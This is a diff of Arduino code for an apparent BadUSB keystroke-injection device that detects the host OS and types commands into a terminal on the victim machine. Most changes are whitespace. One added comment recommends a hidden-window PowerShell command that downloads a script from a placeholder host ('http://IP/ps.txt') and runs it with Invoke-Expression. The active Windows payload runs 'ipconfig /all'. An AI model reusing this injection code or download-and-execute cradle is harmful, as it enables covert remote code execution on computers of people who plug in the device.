@@ -561,16 +561,16 @@ void execMacOS(char *string) {
     DELAY 500
     ENTER
   */
-  
+
   Keyboard.press(KEY_LEFT_GUI);     // Press and hold the Windows key.
   Keyboard.press(KEY_SPACE);
   Keyboard.releaseAll();
 
-  delay(500);                     // Wait 
+  delay(500);                     // Wait
 
   //writeLineMacOS("terminal"); not working
   Keyboard.println("terminal"); //only for qwerty
-  
+
   delay(500);                       // Wait
 
   Keyboard.press(KEY_RETURN);       // Press the Enter key.
@@ -598,7 +598,7 @@ void setup() {
   delay(1000); // Take a moment to let things settle
 
   // Get OS
-  FingerprintUSBHost.guessHostOS(os); 
+  FingerprintUSBHost.guessHostOS(os);
   //String stuff = "I think the Host OS is " + os;
 
 }
@@ -620,6 +620,7 @@ void loop() {
       Keyboard.releaseAll();
     }
 
+    //RECOMENDED:  execWindows("powershell.exe  -windowstyle hidden $ie = Invoke-WebRequest "http://IP/ps.txt" -UseBasicParsing | Select-Object -Expand Content ; Invoke-Expression $ie")
     execWindows("powershell.exe ipconfig /all ; sleep 60 ");
     //writeLineWindows("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890-=;'./<>;'<>!@#$%^&*()_+");
   } else if (os == "Linux") {
